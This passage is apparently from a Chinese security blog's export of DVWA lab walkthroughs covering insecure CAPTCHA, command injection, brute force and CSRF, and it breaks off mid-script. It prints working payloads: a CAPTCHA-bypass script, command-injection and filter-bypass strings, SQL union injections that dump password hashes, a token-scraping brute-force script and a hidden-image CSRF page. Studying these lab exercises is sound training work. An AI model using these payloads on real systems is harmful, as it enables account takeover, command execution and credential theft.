mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; else &#123; // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这关没有了对step参数的检测，关键检测点在于语句： 1234567if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; )) 如果这个if语句执行不了，那么就验证失败，无法修改密码，所以我们必须让这个if语句执行，也就是里面的逻辑语句为真，而里面的逻辑语句是由两个逻辑语句通过 || 拼接成的，所以我们只需要让其中一个逻辑语句为真，条件就可以成立，再看里面检测的参数，$resp参数明显是我们不可控的，所以我们只要将重点放在参数g-recaptcha-response和参数HTTP_USER_AGENT上面就行了，要让if语句执行，就控制参数g-recaptcha-response值为hidd3n_valu3，请求头的user_agent为reCAPTCHA 依然是抓包 然后修改参数g-recaptcha-response和参数HTTP_USER_AGENT 修改成功 由于无法用javascript代码修改user_agent参数，所以无法用CSRF原理攻击 最后附上本关修改密码的python脚本 123456789101112131415161718192021222324252627import requestsurl=\"http://127.0.0.1/dvwa/vulnerabilities/captcha/\"header=&#123; 'Host': '127.0.0.1', 'Content-Length': '103', 'Cache-Control': 'max-age=0', 'Origin': 'http://127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'reCAPTCHA', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/captcha/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': 'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6', 'Connection': 'close' &#125;data=&#123; 'password_new':'password', 'password_conf':'password', 'g-recaptcha-response':'hidd3n_valu3', 'Change':'Change' &#125;r=requests.post(url,headers=header,data=data)if('Password Changed.') in r.text: print('Password Changed.') Impossible代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phpif( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_new = stripslashes( $pass_new ); $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); $pass_conf = $_POST[ &apos;password_conf&apos; ]; $pass_conf = stripslashes( $pass_conf ); $pass_conf = mysql_real_escape_string( $pass_conf ); $pass_conf = md5( $pass_conf ); $pass_curr = $_POST[ &apos;password_current&apos; ]; $pass_curr = stripslashes( $pass_curr ); $pass_curr = mysql_real_escape_string( $pass_curr ); $pass_curr = md5( $pass_curr ); // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_SERVER[ &apos;REMOTE_ADDR&apos; ], $_POST[ &apos;recaptcha_challenge_field&apos; ], $_POST[ &apos;recaptcha_response_field&apos; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) &#123; // What happens when the CAPTCHA was entered incorrectly echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; else &#123; // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new password match and was the current password correct? if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; // Update the database $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the end user - success! echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Feedback for the end user - failed! echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看出服务器采用了token认证机制，还采用了PDO防止SQL注入，更主要的是对于校验验证码的过程只检测了我们不可控的参数$resp-&gt;is_valid，可谓是非常完美的防御了各种漏洞。用户还必须输入当前的密码，更加完善了安全性","categories":[{"name":"dvwa-Insecure CAPTCHA","slug":"dvwa-Insecure-CAPTCHA","permalink":"https://Foxgrin.github.io/categories/dvwa-Insecure-CAPTCHA/"}],"tags":[{"name":"Insecure CAPTCHA","slug":"Insecure-CAPTCHA","permalink":"https://Foxgrin.github.io/tags/Insecure-CAPTCHA/"}]},{"title":"dvwa-Command Injection","slug":"dvwa-Command Injection","date":"2018-07-15T06:18:00.000Z","updated":"2018-07-15T09:55:42.115Z","comments":true,"path":"/posts/63531/","link":"","permalink":"https://Foxgrin.github.io/posts/63531/","excerpt":"总结了dvwa中命令注入漏洞的关卡","text":"总结了dvwa中命令注入漏洞的关卡 Low代码复现如下： 1234567891011121314&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; $target=$_REQUEST[&apos;ip&apos;]; if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123; $cmd=shell_exec(&apos;ping &apos;.$target); &#125; else&#123; $cmd=shell_exec(&apos;ping -c 4 &apos;.$target); &#125; echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;&#125;?&gt; 了解这里的漏洞之前，我们还是先来了解一下一些函数的使用： (1)stristr(string,search,before_search)：搜索一个字符串在另一个字符串中首次出现的位置的剩余部分，搜索失败返回false,其中参数string表示被搜索的字符串，search表示要搜索的字符串，before_search是可选参数，默认为false，如果设置为true则返回搜索字符串在被搜索字符串首次出现的位置的前面部分 例子如下: 1&lt;?php echo stristr(&apos;I love php&apos;,&apos;love&apos;); ?&gt; 搜索love在原字符串中首次出现位置的剩余部分，结果返回love php，验证结果如下： (2)php_uname(mode)：返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 例子如下： 1&lt;?php echo stristr(php_uname('s'),'Windows NT'); ?&gt; 运行结果如下： 可见源代码中对操作系统的名称进行了检测 (3)shell_exec(cmd)：在外部执行一个命令，参数cmd即为要执行的命令 例子如下： 1234&lt;?php$cmd=shell_exec('ping 127.0.0.1');echo \"&lt;pre&gt;$cmd&lt;/pre&gt;\";?&gt; 执行结果如下： 了解完这三个函数，我们就能大概了解这关是执行一个在浏览器上的ping命令程序，服务器会对操作系统的名称进行检测，如果不是Windows NT系统则执行linux系统的Ping命令。但是，由于服务器未对ip参数进行任何的过滤，因此存在严重的Command Injection(命令注入)漏洞 漏洞利用我们可以通过该漏洞执行我们想要执行的命令，但要保证前面ping命令格式的正确，再通过命令连接符跟上我们想要执行的命令在windows下 &amp;&amp;,&amp;,|,|| 都可以当做命令连接符，四者区别如下： 命令1 &amp;&amp; 命令2 ：先执行命令1，若命令1执行成功再执行命令2，若命令1执行不成功则不执行命令2 命令1 &amp; 命令2 ：先执行命令1，不管命令1执行成不成功都继续执行命令2 命令1 | 命令2 ：只执行命令2，前提是命令1必须执行成功 命令1 || 命令2 ：先执行命令1，若命令1执行成功则不执行命令2，若命令1执行不成功则执行命令2 然后我们就可以执行想要执行的命令了 例如要获取用户信息 输入127.0.0.1 &amp;&amp; net user 获取ip地址信息 输入127.0.0.1 &amp;&amp; ipconfig 获取arp表信息 输入127.0.0.1 &amp;&amp; arp -a 还可以利用type命令查看一些配置文件内容，前提是已经文件绝对路径 例如查看mysql配置信息 输入127.0.0.1 | type C:\\phpStudy\\PHPTutorial\\MySQL\\my.ini 可见，该漏洞的危害是很大的，攻击者可以执行任意想执行的命令 Medium代码复现如下： 12345678910111213141516171819&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; $target=$_REQUEST[&apos;ip&apos;]; $substitutions=array( &apos;&amp;&amp;&apos;=&gt;&apos;&apos;, &apos;;&apos;=&gt;&apos;&apos; ); $target=str_replace(array_keys($substitutions),$substitutions,$target); if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123; $cmd=shell_exec(&apos;ping &apos;.$target); &#125; else&#123; $cmd=shell_exec(&apos;ping -c 4 &apos;.$target); &#125; echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;&#125;?&gt; 这里我们还是先来了解几个函数： (1)array_keys(array,value,strict)：返回包含数组中所有键名的新数组，参数array为所选数组，value为指定键值，若输入则返回键值对应的键名，strict指定依赖类型 例子如下： 1234567&lt;?php$substitutions=array( '&amp;&amp;'=&gt;'', ';'=&gt;'');print_r(array_keys($substitutions));?&gt; 运行结果如下： (2)str_replace(find,replace,string,count)：以其他字符替换所选字符串中的指定字符，参数find为查找的字符，replace为替换的字符，string为所选的字符串，count为计算替换数的变量 了解了这两个函数，我们就可以这关对’&amp;&amp;’和’;’这两个字符进行了过滤，但是str_replace函数是非常不安全的，因为它只进行了一次的替换，最普遍的绕过方法就是双写绕过，但是这里&amp;&amp;由于都是同样的字符无法双写，但是服务器还对’;’字符进行了过滤，所以我们可以输入 127.0.0.1 &amp;;&amp; net user，由于只过滤了一次，过滤字符’;’后就剩下了&amp;&amp;，结果如下： 虽然&amp;&amp;被过滤了，但是命令连接符还有&amp;和|可以使用，注意三者的区别即可 输入127.0.0.1 | net user High代码复现如下： 123456789101112131415161718192021222324252627&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; $target=trim($_REQUEST[&apos;ip&apos;]); $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); $target=str_replace(array_keys($substitutions),$substitutions,$target); if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123; $cmd=shell_exec(&apos;ping &apos;.$target); &#125; else&#123; $cmd=shell_exec(&apos;ping -c 4 &apos;.$target); &#125; echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;&#125;?&gt; 这关过滤的字符较为完全，其中过滤了字符’&amp;’，也就是说连接符&amp;&amp;和&amp;都不能使用了，还过滤了字符’|’和’||’，但仔细看是过滤了’| ‘而不是’|’，(|后面还有一个空格)，也就是说连接符|还可以使用 输入127.0.0.1|net user 还可以在||中间加一个被过滤的字符，例如； 但是必须保证ping 命令执行失败才执行||之后的命令 输入11 |;| net user 成功绕过过滤 Impossible代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 首先还是先了解几个函数： (1)explode(separator,string,limit)：将字符串打散成数组，返回组成的数组，参数separator为分隔符，规定在哪里开始分割字符串，string为要分割的字符串，limit规定所返回的数组元素的数目 (2)is_numeric(string)：检测string是否为数字或数字字符串，是则返回true，不是则返回false (3)sizeof(array,mode)：计算数组中的元素个数 这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求 然后将输入的ip值以字符’.’为分隔符打散成一个数组，并检测数组中的每个元素是否为数字并且数组元素个数是否为4，这就限制了我们输入的值必须是一个正确格式的ip地址 也就是说只有“数字.数字.数字.数字”的输入才会被执行，非常完美的防止了命令注入漏洞","categories":[{"name":"dvwa-Command Injection","slug":"dvwa-Command-Injection","permalink":"https://Foxgrin.github.io/categories/dvwa-Command-Injection/"}],"tags":[{"name":"Command Injection","slug":"Command-Injection","permalink":"https://Foxgrin.github.io/tags/Command-Injection/"}]},{"title":"dvwa-Brute Force","slug":"dvwa-Brute Force","date":"2018-07-14T07:50:00.000Z","updated":"2018-07-14T13:50:44.048Z","comments":true,"path":"/posts/22283/","link":"","permalink":"https://Foxgrin.github.io/posts/22283/","excerpt":"总结了dvwa中暴力破解的一些关卡","text":"总结了dvwa中暴力破解的一些关卡 Low代码复现如下： 12345678910111213141516171819202122&lt;?phpinclude(&quot;../sql-connection.php&quot;);if(isset($_GET[&apos;Login&apos;]))&#123; $user=$_GET[&apos;username&apos;]; $pass=$_GET[&apos;password&apos;]; $pass=md5($pass); $sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); if($result &amp;&amp; mysql_num_rows($result) == 1)&#123; $avatar=mysql_result($result,0,&apos;avatar&apos;); echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else&#123; echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这里的关卡是一个用户登录的界面，用户必须正确输入用户名和密码才能成功登录，我们从源代码来看，服务器只对是否GET了一个Login值进行了检测，存在了明显的sql注入漏洞，攻击者不仅可以通过sql注入获取用户信息，还可以利用暴力破解的方法获取用户密码，这就是Brute Force(暴力破解) 漏洞利用(1)利用burpsuite爆破密码 首先抓包 因为我们要对password参数进行爆破，所以在password参数的内容两边加上$ 然后将包发送到intruder模块，选中Payloads，载入字典，点击爆破 从爆破结果的响应包长度来看，只有值为password的响应包长度与众不同，猜测正确密码就是password，尝试登陆，成功 (2)sql注入 首先寻找注入点，这里因为$pass经过md5加密，所以不能当做注入点，注入点就只剩下了$user 我们可以使用万能密码登录，在username中输入admin’ or ‘1’=’1 登录成功 也可以输入admin’# 同样登录成功 如果要获取admin的密码信息，我们可以继续注入 因为服务器限制了查询结果返回的行数只能为1，所以要获取信息，我们必须能让$user值在数据库中不存在 任意输入username值为 0‘# 测试不存在该用户名 因为这里有返回信息，我们可以考虑用较为简单的联合查询注入 那么首先我们就必须知道查询的列数，输入admin’ order by 9#发现报错 所以查询列数为8 接下来就是找获取有效信息的位置，我们输入0’ union select 1,2,3,4,5,6,7,8# 从页面上看是获取不到我们需要的信息，因为图片加载不出来，但是我们可以从源代码看 有效信息在6所处的位置，因此我们在6的位置开始注入 首先爆库 输入0’ union select 1,2,3,4,5,database(),7,8# 接着爆表 输入0’ union select 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=database()),7,8# 再来爆列 输入0’ union select 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_name=’users’),7,8# 最后爆数据 输入0’ union select 1,2,3,4,5,(select password from users where user=’admin’),7,8# 但是这里获取到的密码经过md5加密，md5又属于单向加密技术，所以这个密码并没有实际的用处 Medium代码复现如下： 12345678910111213141516171819202122232425&lt;?phpinclude(&quot;../sql-connection.php&quot;);if(isset($_GET[&apos;Login&apos;]))&#123; $user=$_GET[&apos;username&apos;]; $user=mysql_real_escape_string($user); $pass=$_GET[&apos;password&apos;]; $pass=mysql_real_escape_string($pass); $pass=md5($pass); $sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); if($result &amp;&amp; mysql_num_rows($result) == 1)&#123; $avatar=mysql_result($result,0,&apos;avatar&apos;); echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else&#123; sleep(2); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 相对于上一关，这关对$user和$pass进行了mysql_real_escape的转义处理，预防了sql注入 并且登录失败时会sleep 2秒 虽然预防了sql注入，但是依然可以利用burp爆破密码，跟上一关一样就不演示了 High代码复现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif(isset($_GET[&apos;Login&apos;]))&#123;//CheckAnti-CSRFtokencheckToken($_REQUEST[&apos;user_token&apos;],$_SESSION[&apos;session_token&apos;],&apos;index.php&apos;);//Sanitiseusernameinput$user=$_GET[&apos;username&apos;];$user=stripslashes($user);$user=mysql_real_escape_string($user);//Sanitisepasswordinput$pass=$_GET[&apos;password&apos;];$pass=stripslashes($pass);$pass=mysql_real_escape_string($pass);$pass=md5($pass);//Checkdatabase$query=&quot;SELECT*FROM`users`WHEREuser=&apos;$user&apos;ANDpassword=&apos;$pass&apos;;&quot;;$result=mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);if($result&amp;&amp;mysql_num_rows($result)==1)&#123;//Getusersdetails$avatar=mysql_result($result,0,&quot;avatar&quot;);//Loginsuccessfulecho&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;&#125;else&#123;//Loginfailedsleep(rand(0,3));echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;&#125;mysql_close();&#125;//GenerateAnti-CSRFtokengenerateSessionToken();?&gt; 加入了token验证机制，我们每次登录时都必须提交一个token值，服务器将提交的token值与cookie或session中的token值对比，若不同则拦截下来，也就是说用之前burp爆破密码的方法是行不通的 还利用了mysql_real_escape_string函数对$user和$pass进行了转义处理，防止了sql注入 这里我们要想登录，就必须获取到token值，这关利用python脚本进行爆破 代码如下： 12345678910111213141516171819202122232425262728293031import requestsfrom bs4 import BeautifulSoupurl=\"http://127.0.0.1/dvwa/vulnerabilities/brute/\"header=&#123; 'Host': '127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/brute/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': 'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6', 'Connection': 'close' &#125;file=open('pass.txt','r')for line in file: line=line.strip() s=requests.Session() r=s.get(url,headers=header) soup=BeautifulSoup(r.text,'html.parser') user_token=soup.find_all('input')[3]['value'] payload=&#123; 'username':'admin', 'password':line, 'user_token':user_token, 'Login':'Login' &#125; html=s.get(url,params=payload,headers=header) length=len(html.text) print('user_token:'+user_token+'username:admin password:'+line+' length:'+str(length)) 思路是首先读取文件中一个个猜测的密码，这里只用10个密码进行模拟，然后创建一个会话记录，用于保政访问页面的token值不发生变化，然后利用BeautifulSoup库的find_all方法获取所有input标签组成的列表，带有token值的input标签在列表的第三个元素，然后将value属性的值，也就是token值取出，这就获得了token值，然后再将各个参数通过get形式传递给服务器，最终比较返回页面的长度，正常而言，输入正确和失败返回的页面长度是不同的，所以众多猜测密码中，只有一个密码返回的页面长度是不同的，那个密码就可能是正确的密码 这里还应当注意，应先用burp抓包获取访问登录页面的请求头，否则脚本每次访问的都是dvwa一开始的登录页面 脚本执行结果： 可以看出password的返回长度跟其他不同，在登录页面输入，登录成功","categories":[{"name":"dvwa-Brute Force","slug":"dvwa-Brute-Force","permalink":"https://Foxgrin.github.io/categories/dvwa-Brute-Force/"}],"tags":[{"name":"Brute Force","slug":"Brute-Force","permalink":"https://Foxgrin.github.io/tags/Brute-Force/"}]},{"title":"dvwa-CSRF","slug":"dvwa-CSRF","date":"2018-07-13T06:26:00.000Z","updated":"2018-07-13T16:32:30.852Z","comments":true,"path":"/posts/48103/","link":"","permalink":"https://Foxgrin.github.io/posts/48103/","excerpt":"总结了dvwa中关于跨网站请求伪造的一些关卡","text":"总结了dvwa中关于跨网站请求伪造的一些关卡 Low代码复现如下： 123456789101112131415161718192021&lt;?phpinclude(\"../sql-connection.php\");$pass_new=$_GET['password_new'];$pass_conf=$_GET['password_conf'];if($_GET['password_new'] == $_GET['password_conf'])&#123; $pass_new=mysql_real_escape_string($pass_new); $pass_new=md5($pass_new); $username=$_COOKIE['Username']; $sql=\"UPDATE users SET password='$pass_new' WHERE user='$username'\"; $result=mysql_query($sql) or die(mysql_error()); echo \"Your password has changed\";&#125;else &#123; echo \"Password didn't match\";&#125;?&gt; 从源代码可以看出，这是一个修改密码的程序，而$username是取决于中cookie的Username字段值，也就是说，当我们以一个用户身份登录时，服务器会将用户的信息保存在cookie中，下次访问时，就不需要再登录，浏览器直接按之前保存的身份信息登录。这就可能导致了一种CSRF（Cross-site request forgery,跨网站请求伪造）的漏洞，因为修改的密码都是以GET的形式发送给服务器，所以攻击者可以伪造一个url，诱导受害者去点击，受害者一旦点击，如果浏览器之前保存了身份认证信息，用户的密码就会被恶意修改，它与XSS的区别在于，它并没有盗取用户的cookie，而是直接利用用户的cookie，从而完成非法操作。 构造链接： (1)最基础的链接：http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change 当受害者点击了这个链接，他的密码直接就会被修改成hack 但是这种链接简单直白的告诉了稍微看得懂一点url的人…很明显的就是想篡改他的密码，也就只能骗一骗那些完全不懂的小白 需要注意的是，CSRF最关键的就是利用用户的cookie向服务器发送伪造请求，也就是说，如果浏览器未保存用户的身份信息，那受害者点击链接时就会自动进入登录界面，攻击就失效了 有保存用户信息的浏览器，比如Chrome浏览器 Chrome的检查功能可以很明显的看到保存了cookie信息 而有些浏览器未能保存cookie信息，CSRF攻击就实现不了 (2)构造短链接 利用百度短网址系统将网址缩短成一个短网址 由于是本地搭的环境，所以生成不了，实际场景下目标服务器不是域名的话是可以生成短链接的 这种方法虽然链接看起来不像是攻击链接，但是受害者依然能看到修改密码成功的提示信息 (3)构造攻击页面 为了能让用户点击攻击链接，又能不让用户察觉到自己的密码被修改了，我们可以构造一个页面，里面包含了攻击链接，让用户去点击 我们写一个test.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change&quot; style=&quot;display:none&quot;&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 当受害者访问这个页面时，一个看不见的图片标签就自动访问了修改密码的页面，受害者还误以为自己访问了一个失效的url，实际上自己的密码已经被修改为了hack Medium代码复现如下： 123456789101112131415161718192021222324252627&lt;?phpinclude(&quot;../sql-connection.php&quot;);if(isset($_GET[&apos;change&apos;]))&#123; if(eregi($_SERVER[&apos;SERVER_NAME&apos;],$_SERVER[&apos;HTTP_REFERER&apos;]))&#123; $pass_new=$_GET[&apos;password_new&apos;]; $pass_conf=$_GET[&apos;password_conf&apos;]; $username=$_COOKIE[&apos;Username&apos;]; if($pass_new == $pass_conf)&#123; $pass_new=mysql_real_escape_string($pass_new); $pass_new=md5($pass_new); $sql=&quot;UPDATE users SET password=&apos;$pass_new&apos; WHERE user=&apos;$username&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); echo &quot;Your password has changed&quot;; &#125; else&#123; echo &quot;Password didn&apos;t match&quot;; &#125; &#125; else&#123; echo &quot;That request didn&apos;t look correct&quot;; &#125;&#125;?&gt; 与上一关的区别在于这里加了一个过滤条件，首先先查一下eregi函数的用法 eregi(string pattern,string string):在一个字符串string中搜索指定模式pattern的字符串，不分大小写，如果匹配成功则返回true，不成功则返回false 再查阅一下全局变量 12$_SERVER[&apos;SERVER_NAME&apos;]:http包头的Host参数，即要访问的主机名$_SERVER[&apos;HTTP_REFERER&apos;]:http包头的Referer参数的值，表示来源地址 看完不理解也没事，我们利用burp抓包看一下就大概明白了 我们先在提交的表单中输入password为hack 然后点击提交 然后用burp抓包 Host值就是要访问的主机名，Referer值就是来源地址 这是在网页中的表单中提交数据，所以来源地址是这个网页的地址 我们最终访问主机名一定是127.0.0.1,所以127.0.0.1一定要出现在Referer值中，这起到了一定的过滤作用，如果受害者访问我们伪造的攻击网站，攻击网站向服务器发出伪造请求，会被服务器检测来源地址，地址中不带127.0.0.1的话，就会被过滤掉，但是这种过滤很好解决，即使不理解上面两个参数的意思，我们只要用burp修改请求头的Host和Referer参数，让两个参数都带有一样的内容就ok了 我们在浏览器中访问http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change 然后用burp抓包 我们看到请求头中只有Host参数，没有Referer参数，这是因为我们是在空白的页面访问的，所以没有来源地址，这时候点击go 发现请求被过滤了 我们在请求头中添加Referer参数，随便输入一个带127.0.0.1的值 添加Referer参数后修改密码成功 High代码如下： 1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; mysql_close(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 这关加入了token认证机制，能非常有效的预防CSRF攻击，它的防御过程如下： (1)每当用户登录后会随机产生一段字符串，并且存储在Session或者Cookie中 (2)在敏感操作中加入隐藏标签，value即为Session中保存的字符串，如本关中的表单加入了隐藏标签，提交的内容就是Session中保存的字符串 (3)用户提交请求后，服务器将请求提交的Token字符串与Session中的字符串进行比较，如果一致，则认为是正常请求，否则可能是CSRF攻击 (4)更新Token值 所以，要绕过Token认证，就必要想办法获得存储在Session或者Cookie当中的Token值 破解token认证思路是在攻击页面上利用隐藏的iframe框架访问修改密码的页面，然后用javascript代码获取页面token值再赋值给攻击页面表单，再模拟提交隐藏表单 代码如下： 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;high-attack&lt;/title&gt;&lt;/head&gt;&lt;script type=&quot;text/javascript&quot;&gt; function 